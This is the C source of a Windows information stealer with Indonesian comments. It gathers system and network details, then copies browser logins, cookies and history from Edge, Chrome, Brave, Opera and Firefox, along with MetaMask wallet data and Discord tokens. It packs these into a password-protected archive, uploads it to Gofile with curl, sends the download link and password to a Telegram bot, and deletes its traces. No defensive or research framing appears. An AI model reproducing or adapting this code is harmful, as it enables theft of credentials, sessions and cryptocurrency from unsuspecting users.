#include <windows.h>
#include <stdio.h>
#include <time.h>
#include <wininet.h>

// Variabel Dasar
const char *zipPassword = "P@ssw0rd"; 
const char *cwd = "C:\\Windows\\Temp";

// Utilitas
void createDir(const char *path) {
    CreateDirectoryA(path, NULL);
}

void copyIfExists(const char *src, const char *dst) {
    if (GetFileAttributesA(src) != INVALID_FILE_ATTRIBUTES) {
        CopyFileA(src, dst, FALSE);
    }
}

void runCommand(FILE *f, const char *cmd, const char *title) {
    fprintf(f, "\n=== %s ===\n", title);
    FILE *pipe = _popen(cmd, "r");
    if (!pipe) return;
    char buffer[512];
    while (fgets(buffer, sizeof(buffer), pipe)) {
        fprintf(f, "%s", buffer);
    }
    _pclose(pipe);
}

// Informasi target 
void writeInfo(const char *dest) {
    char infoFile[MAX_PATH];
    sprintf(infoFile, "%s\\hostinfo.txt", dest);
    FILE *f = fopen(infoFile, "w");
    if (!f) return;

    // Timestamp
    time_t now = time(NULL);
    fprintf(f, "Timestamp: %s", ctime(&now));

    // IP Publik
    fprintf(f, "\n=== Public IP ===\n");
    HINTERNET hInternet = InternetOpenA("ipcheck", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hInternet) {
        HINTERNET hUrl = InternetOpenUrlA(hInternet, "http://ipinfo.io/ip", NULL, 0, INTERNET_FLAG_RELOAD, 0);
        if (hUrl) {
            char buffer[128]; DWORD bytesRead;
            if (InternetReadFile(hUrl, buffer, sizeof(buffer)-1, &bytesRead) && bytesRead > 0) {
                buffer[bytesRead] = 0;
                fprintf(f, "Public IP: %s\n", buffer);
            }
            InternetCloseHandle(hUrl);
        }
        InternetCloseHandle(hInternet);
    }

    // Enumerasi
    runCommand(f, "systeminfo", "System Info");
    runCommand(f, "wmic logicaldisk get caption,volumename,freespace,size", "Disk Info");
    runCommand(f, "tasklist", "Running Processes (Tasklist)");
    runCommand(f, "net config workstation", "Domain / Workgroup Info");
    runCommand(f, "net view", "Net View (Shared Resources)");
    runCommand(f, "ipconfig /all", "Network Configuration");
    runCommand(f, "dir C:\\", "Root File Listing (C:\\)");
    runCommand(f, "netstat -ano", "Listening Ports");
    runCommand(f, "sc query type= service state= all", "All Services");

    fclose(f);
}

// Mengumpulkan informasi browser 
void collectBrowser(const char *name, const char *path, const char *dest) {
    DWORD attr = GetFileAttributesA(path);
    if (attr == INVALID_FILE_ATTRIBUTES || !(attr & FILE_ATTRIBUTE_DIRECTORY)) {
        return;
    }

    char outBase[MAX_PATH];
    sprintf(outBase, "%s\\%s", dest, name);
    createDir(outBase);

    printf("\n=== %s ditemukan ===\n", name);

    // Copy Local State (umum Chromium)
    char srcFile[MAX_PATH], dstFile[MAX_PATH];
    sprintf(srcFile, "%s\\Local State", path);
    sprintf(dstFile, "%s\\Local State", outBase);
    copyIfExists(srcFile, dstFile);

    // Iterasi semua profile
    char searchPath[MAX_PATH];
    sprintf(searchPath, "%s\\*", path);
    WIN32_FIND_DATAA ffd;
    HANDLE hFind = FindFirstFileA(searchPath, &ffd);

    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                if (strcmp(ffd.cFileName, ".") == 0 || strcmp(ffd.cFileName, "..") == 0)
                    continue;

                char profilePath[MAX_PATH], outProfile[MAX_PATH];
                sprintf(profilePath, "%s\\%s", path, ffd.cFileName);
                sprintf(outProfile, "%s\\%s", outBase, ffd.cFileName);
                createDir(outProfile);

                printf("-> Copy profile %s\n", ffd.cFileName);

                const char *files[] = { "Login Data", "Cookies", "Web Data", "History" };
                for (int i = 0; i < 4; i++) {
                    sprintf(srcFile, "%s\\%s", profilePath, files[i]);
                    sprintf(dstFile, "%s\\%s", outProfile, files[i]);
                    copyIfExists(srcFile, dstFile);
                }

                // Cek wallet extension Metamask
                sprintf(srcFile, "%s\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn", profilePath);
                if (GetFileAttributesA(srcFile) != INVALID_FILE_ATTRIBUTES) {
                    sprintf(dstFile, "%s\\MetaMask", outProfile);
                    createDir(dstFile);
                    sprintf(srcFile, "%s\\000003.log", srcFile);
                    sprintf(dstFile, "%s\\000003.log", dstFile);
                    copyIfExists(srcFile, dstFile);
                }
            }
        } while (FindNextFileA(hFind, &ffd));
        FindClose(hFind);
    }
}

// Mengumpulkan Informasi Discord 
void collectDiscord(const char *localAppData, const char *dest) {
    char base[MAX_PATH];
    sprintf(base, "%s\\discord", localAppData);

    DWORD attr = GetFileAttributesA(base);
    if (attr == INVALID_FILE_ATTRIBUTES || !(attr & FILE_ATTRIBUTE_DIRECTORY)) {
        return;
    }

    char out[MAX_PATH];
    sprintf(out, "%s\\Discord", dest);
    createDir(out);

    printf("\n=== Discord ditemukan ===\n");

    const char *files[] = { "Local Storage\\leveldb", "Cookies" };
    for (int i = 0; i < 2; i++) {
        char src[MAX_PATH], dst[MAX_PATH];
        sprintf(src, "%s\\%s", base, files[i]);
        sprintf(dst, "%s\\%s", out, files[i]);
        copyIfExists(src, dst);
    }
}

// Upload ke Gofile dan simpan URL hasil upload di downloadUrl
void uploadToGofile(const char *zipPath, char *downloadUrl, size_t urlSize) {
    char cmd[MAX_PATH * 8];
    char server[128] = {0};

    printf("Mendapatkan server Gofile...\n");

    // Ambil server pertama via curl + PowerShell parsing JSON
    snprintf(cmd, sizeof(cmd),
        "powershell -Command \"$s=Invoke-RestMethod -Uri 'https://api.gofile.io/servers'; "
        "$s.data.servers[0].name\" > server.txt");
    system(cmd);

    FILE *f = fopen("server.txt", "r");
    if (!f) {
        printf("Gagal membaca server\n");
        return;
    }
    fscanf(f, "%127s", server);
    fclose(f);
    remove("server.txt");

    if (strlen(server) == 0) {
        printf("Tidak ada server ditemukan\n");
        return;
    }

    printf("Server terpilih: %s\n", server);

    // Upload file ke server
    snprintf(cmd, sizeof(cmd),
        "curl -s -F \"file=@%s\" https://%s.gofile.io/uploadFile > response.txt",
        zipPath, server);
    printf("Mengunggah ZIP ke Gofile...\n");
    int rc = system(cmd);
    if (rc != 0) {
        printf("Upload gagal (exit code %d)\n", rc);
        remove("response.txt");
        return;
    }

    // Ambil URL download dari response JSON
    f = fopen("response.txt", "r");
    if (f) {
        char buffer[4096];
        fread(buffer, 1, sizeof(buffer)-1, f);
        fclose(f);
        remove("response.txt");
        buffer[sizeof(buffer)-1] = 0;

        char *p = strstr(buffer, "\"downloadPage\":\"");
        if (p) {
            p += strlen("\"downloadPage\":\"");
            char *q = strchr(p, '"');
            if (q) {
                size_t len = q - p;
                if (len >= urlSize) len = urlSize - 1;
                strncpy(downloadUrl, p, len);
                downloadUrl[len] = 0;
            }
        }
    }

    if (strlen(downloadUrl) > 0) {
        printf("Telah diunggah: URL unduh - %s\n", downloadUrl);
    } else {
        printf("Telah diunggah: Tidak ada URL unduh\n");
    }
}

// Kirim notifikasi ke Telegram
void sendTelegramMessage(const char *message) {
    char cmd[MAX_PATH * 4];
    const char *botToken = "XXXXXXXXXX:YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY";
    const char *chatId   = "ZZZZZZZZZZ";

    snprintf(cmd, sizeof(cmd),
        "curl -s -X POST -d \"chat_id=%s\" -d \"text=%s\" "
        "https://api.telegram.org/bot%s/sendMessage",
        chatId, message, botToken);

    system(cmd);
}

// Menjalankan fungsi pengarsipan (7z.exe)
int fileExists(const char *path) {
    DWORD a = GetFileAttributesA(path);
    return (a != INVALID_FILE_ATTRIBUTES && !(a & FILE_ATTRIBUTE_DIRECTORY));
}

// Ekstrak 7z.exe dari resource ke path yang ditentukan
int extract7z(const char *outPath) {
    HRSRC hRes = FindResource(NULL, "7ZBIN", RT_RCDATA);
    if (!hRes) return 1;

    HGLOBAL hData = LoadResource(NULL, hRes);
    if (!hData) return 2;

    DWORD size = SizeofResource(NULL, hRes);
    void *pData = LockResource(hData);
    if (!pData) return 3;

    FILE *f = fopen(outPath, "wb");
    if (!f) return 4;
    fwrite(pData, 1, size, f);
    fclose(f);

    return 0;
}

void createZip(const char *dest) {
    char sevenZipPath[MAX_PATH];
    char zipPath[MAX_PATH];
    char destCopy[MAX_PATH];
    char cmdLine[2048];
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;

    // Ekstrak 7z.exe ke folder TEMP (bawaan Windows)
    GetTempPathA(MAX_PATH, sevenZipPath);
    strcat(sevenZipPath, "7z.exe");

    if (!fileExists(sevenZipPath)) {
        if (extract7z(sevenZipPath) != 0) {
            printf("Gagal ekstrak 7z.exe dari resource!\n");
            return;
        }
    }

    // Pindahkan ke buffer lokal
    strncpy(destCopy, dest, sizeof(destCopy) - 1);
    destCopy[sizeof(destCopy) - 1] = '\0';
    while (strlen(destCopy) > 0) {
        size_t L = strlen(destCopy);
        if (destCopy[L - 1] == '\\' || destCopy[L - 1] == '/') destCopy[L - 1] = '\0';
        else break;
    }

    // Membuat nama file zip
    if (strlen(destCopy) + 4 >= sizeof(zipPath)) {
        printf("Path terlalu panjang untuk membuat zipPath\n");
        return;
    }
    snprintf(zipPath, sizeof(zipPath), "%s.zip", destCopy);

    // CreateProcess
    // Penting: Jangan gunakan wildcard \"...\\*\" — berikan folder saja, 7z -r akan rekursif.
    snprintf(cmdLine, sizeof(cmdLine),
        "\"%s\" a -tzip -p\"%s\" -mem=AES256 -r \"%s\" \"%s\"",
        sevenZipPath,
        zipPassword,
        zipPath,
        destCopy);

    printf("Mengarsipkan dengan 7-Zip (password)...\n");
    printf("Perintah: %s\n", cmdLine);

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    // Jalankan 7z langsung (tidak lewat cmd.exe) supaya parsing lebih predictable
    if (!CreateProcessA(
            NULL,
            cmdLine,
            NULL, NULL, FALSE,
            0, NULL, NULL, &si, &pi)) {
        DWORD err = GetLastError();
        char msg[256] = {0};
        FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
                       NULL, err, 0, msg, sizeof(msg), NULL);
        printf("CreateProcess gagal: %u - %s\n", err, msg);
        return;
    }

    // Tunggu selesai
    WaitForSingleObject(pi.hProcess, INFINITE);
    DWORD exitCode = 0;
    GetExitCodeProcess(pi.hProcess, &exitCode);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    if (exitCode != 0) {
        printf("Mengarsipkan gagal (exit code %u)\n", exitCode);
    } else {
        printf("Mengarsipkan selesai: %s\n", zipPath);
    }

    // Hiding file
    if (SetFileAttributesA(zipPath, FILE_ATTRIBUTE_HIDDEN)) {
        printf("Menyembunyikan file zip\n");
    } else {
        DWORD err = GetLastError();
        printf("Gagal Menyembunyikan file zip (error %lu)\n", err);
    }

    // --- Upload ke Gofile ---
    char gofileUrl[1024] = {0};
    uploadToGofile(zipPath, gofileUrl, sizeof(gofileUrl));

    if (strlen(gofileUrl) > 0) {
        char msg[2048];
        snprintf(msg, sizeof(msg),
                "Link gofile:%s | passwordnya:%s",
                gofileUrl, zipPassword);
        sendTelegramMessage(msg);
    }


    // Kirim notifikasi Telegram
    if (strlen(gofileUrl) > 0) {
        char msg[2048];
        snprintf(msg, sizeof(msg),
                "Telah diupload\nLink Gofile: %s | passwordnya: %s",
                gofileUrl, zipPassword); 
        sendTelegramMessage(msg);
    }

    // Hapus folder sumber
        char delCmd[MAX_PATH * 4];
        sprintf(delCmd, "cmd /c rd /s /q \"%s\"", dest);
        system(delCmd);
        printf("Telah dihapus: %s\n", dest);

    // Hapus file ZIP setelah upload
    if (DeleteFileA(zipPath)) {
        printf("Telah dihapus: %s\n", zipPath);
    } else {
        DWORD err = GetLastError();
        printf("Gagal menghapus: %s (error %lu)\n", zipPath,err);
    }

    // Bersihkan 7z.exe yang diekstrak
    if (DeleteFileA(sevenZipPath)) {
        printf("Telah dihapus: 7z.exe dari TEMP\n");
    } else {
        DWORD err = GetLastError();
        printf("Gagal menghapus: 7z.exe dari TEMP (error %lu)\n", err);
    }
    
}

int main() {
    char userProfile[MAX_PATH], localAppData[MAX_PATH], dest[MAX_PATH];
    GetEnvironmentVariableA("USERPROFILE", userProfile, MAX_PATH);
    GetEnvironmentVariableA("LOCALAPPDATA", localAppData, MAX_PATH);

    // Buat folder output timestamp
    time_t now = time(NULL);
    struct tm t;
    localtime_s(&t, &now);
    char timestamp[32];
    strftime(timestamp, sizeof(timestamp), "%Y%m%d_%H%M", &t);

    sprintf(dest, "%s\\CollectedData_%s", cwd, timestamp);
    createDir(dest);


    // Info dasar
    writeInfo(dest);

    // Browsers
    collectBrowser("Edge",   strcat(strcpy((char[512]){0}, localAppData), "\\Microsoft\\Edge\\User Data"), dest);
    collectBrowser("Chrome", strcat(strcpy((char[512]){0}, localAppData), "\\Google\\Chrome\\User Data"), dest);
    collectBrowser("Brave",  strcat(strcpy((char[512]){0}, localAppData), "\\BraveSoftware\\Brave-Browser\\User Data"), dest);
    collectBrowser("Opera",  strcat(strcpy((char[512]){0}, localAppData), "\\Opera Software\\Opera Stable"), dest);
    collectBrowser("Firefox",strcat(strcpy((char[512]){0}, userProfile),  "\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles"), dest);

    // Discord
    collectDiscord(localAppData, dest);

    printf("\nSelesai! Data ada di: %s\n", dest);
    createZip(dest);

    return 0;
}
